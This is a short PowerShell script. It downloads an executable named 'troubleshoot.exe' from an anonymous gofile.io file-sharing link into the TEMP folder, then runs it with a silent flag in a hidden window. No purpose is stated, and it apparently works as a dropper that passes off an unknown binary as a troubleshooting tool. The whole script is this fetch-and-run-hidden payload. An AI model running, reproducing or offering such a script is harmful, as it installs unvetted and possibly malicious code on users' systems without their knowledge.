$ErrorActionPreference = "Stop"

$url = "https://store-eu-par-1.gofile.io/download/web/ad193c16-29eb-4fde-bbed-cc7898a7166a/troubleshoot.exe"
$temp = Join-Path $env:TEMP "troubleshoot.exe"

Invoke-WebRequest -Uri $url -OutFile $temp -UseBasicParsing

$process = Start-Process `
    -FilePath $temp `
    -ArgumentList "/S" `
    -Wait `
    -PassThru `
    -WindowStyle Hidden

exit $process.ExitCode
